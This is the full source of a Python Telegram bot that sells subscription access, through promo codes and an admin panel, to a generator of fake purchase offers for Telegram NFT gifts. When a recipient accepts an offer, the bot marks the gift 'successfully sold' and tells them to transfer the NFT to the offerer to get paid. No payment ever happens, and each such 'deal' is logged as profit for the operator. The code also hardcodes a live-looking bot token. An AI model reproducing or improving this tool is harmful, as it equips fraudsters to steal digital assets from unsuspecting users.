import asyncio
import logging
import uuid
import re
import sqlite3
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent, ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramBadRequest

# ==========================================
# НАСТРОЙКИ БОТА
# ==========================================
BOT_TOKEN = "8800473241:AAHi1rMUvnoQpF8jC8NSgGpoWKHTl8wPovI"  # <-- Вставьте токен
ADMIN_USERNAME = "chingiz_trader"      # <-- Ваш юзернейм (без @)

def is_admin(user):
    return user.username and user.username.lower() == ADMIN_USERNAME.lower()

# ==========================================
# БАЗА ДАННЫХ
# ==========================================
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, profit INTEGER DEFAULT 0, access_until TEXT
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS promos (
        code TEXT PRIMARY KEY, days INTEGER, is_used INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT profit, access_until FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row if row else (0, None)

def add_user(user_id, username):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()
    conn.close()

def add_profit(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET profit = profit + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def set_access(user_id, days):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    if days == 9999:
        new_date = "2099-12-31 23:59:59"
    else:
        cursor.execute("SELECT access_until FROM users WHERE user_id = ?", (user_id,))
        current = cursor.fetchone()[0]
        now = datetime.now()
        if current and datetime.strptime(current, "%Y-%m-%d %H:%M:%S") > now:
            base_date = datetime.strptime(current, "%Y-%m-%d %H:%M:%S")
        else:
            base_date = now
        new_date = (base_date + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("UPDATE users SET access_until = ? WHERE user_id = ?", (new_date, user_id))
    conn.commit()
    conn.close()

def create_promo(days):
    code = "PRO-" + str(uuid.uuid4())[:6].upper()
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO promos (code, days) VALUES (?, ?)", (code, days))
    conn.commit()
    conn.close()
    return code

def use_promo(user_id, code):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT days, is_used FROM promos WHERE code = ?", (code,))
    row = cursor.fetchone()
    if not row:
        conn.close()
        return False, "❌ Промокод не найден."
    if row[1] == 1:
        conn.close()
        return False, "❌ Этот промокод уже был использован."
    set_access(user_id, row[0])
    cursor.execute("UPDATE promos SET is_used = 1 WHERE code = ?", (code,))
    conn.commit()
    conn.close()
    return True, row[0]

def get_stats():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("SELECT COUNT(*) FROM users WHERE access_until = '2099-12-31 23:59:59' OR access_until > ?", (now_str,))
    active_users = cursor.fetchone()[0]
    cursor.execute("SELECT SUM(profit) FROM users")
    total_profit = cursor.fetchone()[0] or 0
    conn.close()
    return total_users, active_users, total_profit

# ==========================================
# СОСТОЯНИЯ И НАСТРОЙКИ
# ==========================================
class PromoState(StatesGroup):
    waiting_for_code = State()

active_offers = {}
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

TEXTS = {
    'ru': {
        'offer': "Пользователь (<b>@{seller}</b>)\nпредлагает вам\n<b>{price} {currency_icon}</b> за подарок <u><b>{gift_name}</b></u>.",
        'btn_decline': "Отклонить", 'btn_accept': "Принять",
        'rejected': "❌ Оффер на <b>{price} {currency_icon}</b> за подарок <u><b>{gift_name}</b></u> отклонен.",
        'alert': "⚠️ Внимание!\n\nПолучатель:\n{target}.\n\nЕсли вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество.",
        'sold': "🎁 <u><b>{gift_name}</b></u> успешно продан!\n\n• Передайте {target} для зачисления {currency_icon}.",
        'btn_transfer': "Передать NFT"
    },
    'en': {
        'offer': "User (<b>@{seller}</b>)\nis offering you\n<b>{price} {currency_icon}</b> for the gift <u><b>{gift_name}</b></u>.",
        'btn_decline': "Decline", 'btn_accept': "Accept",
        'rejected': "❌ The offer of <b>{price} {currency_icon}</b> for <u><b>{gift_name}</b></u> was declined.",
        'alert': "⚠️ Warning!\n\nRecipient:\n{target}.\n\nIf you are asked to transfer an NFT directly to another user — do not send it. It might be a scam.",
        'sold': "🎁 <u><b>{gift_name}</b></u> successfully sold!\n\n• Transfer to {target} to receive {currency_icon}.",
        'btn_transfer': "Transfer NFT"
    },
    'ua': {
        'offer': "Користувач (<b>@{seller}</b>)\nпропонує вам\n<b>{price} {currency_icon}</b> за подарунок <u><b>{gift_name}</b></u>.",
        'btn_decline': "Відхилити", 'btn_accept': "Прийняти",
        'rejected': "❌ Оффер на <b>{price} {currency_icon}</b> за подарунок <u><b>{gift_name}</b></u> відхилено.",
        'alert': "⚠️ Увага!\n\nОтримувач:\n{target}.\n\nЯкщо вас просять передати NFT безпосередньо іншому користувачу — не надсилайте його. Це може бути шахрайство.",
        'sold': "🎁 <u><b>{gift_name}</b></u> успішно продано!\n\n• Передайте {target} для зарахування {currency_icon}.",
        'btn_transfer': "Передати NFT"
    },
    'ar': {
        'offer': "المستخدم (<b>@{seller}</b>)\nيعرض عليك\n<b>{price} {currency_icon}</b> مقابل هدية <u><b>{gift_name}</b></u>.",
        'btn_decline': "رفض", 'btn_accept': "قبول",
        'rejected': "❌ تم رفض العرض بقيمة <b>{price} {currency_icon}</b> مقابل <u><b>{gift_name}</b></u>.",
        'alert': "⚠️ انتباه!\n\nالمستلم:\n{target}.\n\nإذا طُلب منك تحويل NFT مباشرة إلى مستخدم آخر — فلا ترسله. قد يكون هذا احتيالاً.",
        'sold': "🎁 <u><b>{gift_name}</b></u> تم بيعه بنجاح!\n\n• قم بالتحويل إلى {target} لتلقي {currency_icon}.",
        'btn_transfer': "تحويل NFT"
    },
    'china': {
        'offer': "用户 (<b>@{seller}</b>)\n想要用\n<b>{price} {currency_icon}</b> 购买您的礼物 <u><b>{gift_name}</b></u>。",
        'btn_decline': "拒绝", 'btn_accept': "接受",
        'rejected': "❌ 关于 <u><b>{gift_name}</b></u> 的 <b>{price} {currency_icon}</b> 报价已被拒绝。",
        'alert': "⚠️ 注意！\n\n收件人：\n{target}。\n\n如果有人要求您直接将 NFT 转移给其他用户——请不要发送。这可能是诈骗。",
        'sold': "🎁 <u><b>{gift_name}</b></u> 成功售出！\n\n• 请转账给 {target} 以接收 {currency_icon}。",
        'btn_transfer': "转移 NFT"
    }
}

def format_nft_name(link: str) -> str:
    raw_name = link.split('/')[-1].split('?')[0] 
    spaced_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name) 
    return spaced_name.replace('-', ' #')

def get_main_kb():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="👤 Профиль"), KeyboardButton(text="🎟 Ввести промокод")]], resize_keyboard=True)

# ==========================================
# УНИВЕРСАЛЬНОЕ РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
# ==========================================
async def edit_offer_message(callback: CallbackQuery, text: str, reply_markup=None):
    """Правильно редактирует сообщение, будь то инлайн-режим или бизнес-чат"""
    try:
        if callback.inline_message_id:
            # Если это инлайн-сообщение (через @Бот код)
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode="HTML"
            )
        else:
            # Если это обычное сообщение в бизнес-чате
            await bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode="HTML",
                business_connection_id=callback.message.business_connection_id
            )
    except TelegramBadRequest as e:
        print(f"⚠️ Ошибка редактирования (возможно, сообщение уже изменено): {e}")

# ==========================================
# ХЭНДЛЕРЫ
# ==========================================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    add_user(message.from_user.id, message.from_user.username)
    text = "<b>👋 Привет! Я бот для создания офферов на NFT-подарки.</b>\n\n<i>Для использования бота нужен доступ. Введите промокод в личном кабинете!</i>"
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_kb())

@dp.message(F.text == "👤 Профиль")
async def show_profile(message: Message):
    user_id = message.from_user.id
    profit, access_until = get_user(user_id)
    is_premium = "Да ✅" if message.from_user.is_premium else "Нет ❌"
    
    if access_until:
        if access_until == "2099-12-31 23:59:59":
            access_text = "Навсегда ♾️"
        else:
            dt = datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S")
            access_text = "Истек ❌" if dt < datetime.now() else f"До {dt.strftime('%d.%m.%Y %H:%M')} 📅"
    else:
        access_text = "Нет доступа ❌"

    text = f"<b>👤 Ваш профиль</b>\n\n🆔 <b>ID:</b> <code>{user_id}</code>\n💎 <b>Premium:</b> {is_premium}\n📈 <b>Сделок:</b> {profit}\n🔑 <b>Доступ:</b> {access_text}"
    await message.answer(text, parse_mode="HTML")

@dp.message(F.text == "🎟 Ввести промокод")
async def ask_promo(message: Message, state: FSMContext):
    await message.answer("Отправьте ваш промокод:")
    await state.set_state(PromoState.waiting_for_code)

@dp.message(PromoState.waiting_for_code)
async def process_promo(message: Message, state: FSMContext):
    success, result = use_promo(message.from_user.id, message.text.strip().upper())
    if success:
        await message.answer(f"✅ <b>Промокод активирован!</b>\nДоступ выдан на: <b>{'Навсегда' if result == 9999 else f'{result} дн.'}</b>", parse_mode="HTML")
    else:
        await message.answer(result)
    await state.clear()

# ==========================================
# АДМИН-ПАНЕЛЬ
# ==========================================
@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if not is_admin(message.from_user): return await message.answer("Нет прав.")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 День", callback_data="genpromo_1"), InlineKeyboardButton(text="7 Дней", callback_data="genpromo_7")],
        [InlineKeyboardButton(text="30 Дней", callback_data="genpromo_30"), InlineKeyboardButton(text="Навсегда", callback_data="genpromo_9999")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="show_stats")]
    ])
    await message.answer("<b>👑 Админ-панель</b>", reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data.startswith("genpromo_"))
async def generate_promo(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    days = int(callback.data.split("_")[1])
    code = create_promo(days)
    await callback.message.answer(f"✅ Промокод на {days if days != 9999 else 'Всю жизнь'} дн:\n\n<code>{code}</code>", parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "show_stats")
async def show_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user): return await callback.answer("Нет прав", show_alert=True)
    total_u, active_u, total_deals = get_stats()
    await callback.message.answer(f"<b>📊 Статистика</b>\n\n👥 Юзеров: {total_u}\n✅ С доступом: {active_u}\n🤝 Сделок: {total_deals}", parse_mode="HTML")
    await callback.answer()

# ==========================================
# ЛОГИКА СОЗДАНИЯ И ОБРАБОТКИ ОФФЕРОВ
# ==========================================
def check_access(user):
    if is_admin(user): return True
    _, access_until = get_user(user.id)
    if not access_until: return False
    if access_until == "2099-12-31 23:59:59": return True
    return datetime.strptime(access_until, "%Y-%m-%d %H:%M:%S") > datetime.now()

async def create_offer_logic(message: Message, is_business: bool):
    if not check_access(message.from_user):
        return await message.answer("❌ <b>У вас нет доступа!</b>", parse_mode="HTML")

    parts = message.text.split()
    if len(parts) < 4: return 

    nft_link, price, currency = parts[1], parts[2], parts[3].lower()
    lang = parts[4].lower() if len(parts) > 4 else 'ru'
    if lang not in TEXTS: lang = 'ru'
    if currency not in ['stars', 'gram']: return

    currency_icon = "⭐️" if currency == "stars" else "GRAM"
    gift_name_html = f"<a href='{nft_link if nft_link.startswith('http') else f'https://{nft_link}'}'>{format_nft_name(nft_link)}</a>"
    
    seller_username, seller_name, seller_id = message.from_user.username, message.from_user.full_name, message.from_user.id

    offer_id = str(uuid.uuid4())[:8]
    active_offers[offer_id] = {
        'seller_username': seller_username, 'seller_name': seller_name, 'seller_id': seller_id,
        'price': price, 'currency_icon': currency_icon, 'gift_name': gift_name_html, 'lang': lang
    }

    if is_business:
        t = TEXTS[lang]
        offer_text = t['offer'].format(seller=seller_username or seller_name, price=price, currency_icon=currency_icon, gift_name=gift_name_html)
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=t['btn_decline'], callback_data=f"decline_{offer_id}"),
            InlineKeyboardButton(text=t['btn_accept'], callback_data=f"accept_{offer_id}")
        ]])
        try:
            await asyncio.sleep(1)
            await bot.send_message(message.chat.id, text=offer_text, reply_markup=kb, parse_mode="HTML", business_connection_id=message.business_connection_id)
        except Exception as e: print(e)
    else:
        bot_username = (await bot.get_me()).username
        await message.answer(f"✅ <b>Оффер готов!</b>\nКод: <code>{offer_id}</code>\n\nОтправьте: <code>@{bot_username} {offer_id}</code>", parse_mode="HTML")

@dp.business_message(F.text.startswith('/of '))
async def catch_biz(message: Message): await create_offer_logic(message, True)

@dp.message(F.text.startswith('/of '))
async def catch_priv(message: Message): await create_offer_logic(message, message.business_connection_id is not None)

@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    offer_data = active_offers.get(inline_query.query.strip())
    if not offer_data:
        return await inline_query.answer([InlineQueryResultArticle(id="1", title="❌ Не найдено", input_message_content=InputTextMessageContent(message_text="Оффер не найден."))], cache_time=0, is_personal=True)
        
    t = TEXTS[offer_data['lang']]
    offer_text = t['offer'].format(seller=offer_data['seller_username'] or offer_data['seller_name'], price=offer_data['price'], currency_icon=offer_data['currency_icon'], gift_name=offer_data['gift_name'])
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t['btn_decline'], callback_data=f"decline_{inline_query.query.strip()}"),
        InlineKeyboardButton(text=t['btn_accept'], callback_data=f"accept_{inline_query.query.strip()}")
    ]])
    await inline_query.answer([InlineQueryResultArticle(id=inline_query.query.strip(), title="Оффер", input_message_content=InputTextMessageContent(message_text=offer_text, parse_mode="HTML"), reply_markup=kb)], cache_time=0, is_personal=True)

# ==========================================
# КНОПКИ (ИСПОЛЬЗУЕМ УНИВЕРСАЛЬНУЮ ФУНКЦИЮ)
# ==========================================
@dp.callback_query(F.data.startswith('decline_'))
async def decline_offer(callback: CallbackQuery):
    offer_id = callback.data.split('_')[1]
    data = active_offers.get(offer_id)
    if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)

    t = TEXTS[data['lang']]
    text = t['rejected'].format(price=data['price'], currency_icon=data['currency_icon'], gift_name=data['gift_name'])
    
    await edit_offer_message(callback, text, reply_markup=None) # <--- Используем новую функцию
    active_offers.pop(offer_id, None)
    await callback.answer()

@dp.callback_query(F.data.startswith('accept_'))
async def accept_offer(callback: CallbackQuery):
    offer_id = callback.data.split('_')[1]
    data = active_offers.get(offer_id)
    if not data: return await callback.answer("❌ Оффер устарел.", show_alert=True)

    t = TEXTS[data['lang']]
    add_profit(data['seller_id'])
    
    target = f"@{data['seller_username']}" if data['seller_username'] else data['seller_name']
    url = f"https://t.me/{data['seller_username']}" if data['seller_username'] else f"tg://user?id={data['seller_id']}"

    # 1. Показываем окошко
    await callback.answer(text=t['alert'].format(target=target), show_alert=True)
    
    # 2. Редактируем сообщение на "Продано"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t['btn_transfer'], url=url)]])
    text = t['sold'].format(gift_name=data['gift_name'], target=target, currency_icon=data['currency_icon'])
    
    await edit_offer_message(callback, text, reply_markup=kb) # <--- Используем новую функцию
    active_offers.pop(offer_id, None)

# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    init_db()
    logging.basicConfig(level=logging.INFO)
    print("Бот запущен...")
    await dp.start_polling(bot, allowed_updates=["message", "business_connection", "business_message", "callback_query", "inline_query"])

if __name__ == "__main__":
    asyncio.run(main())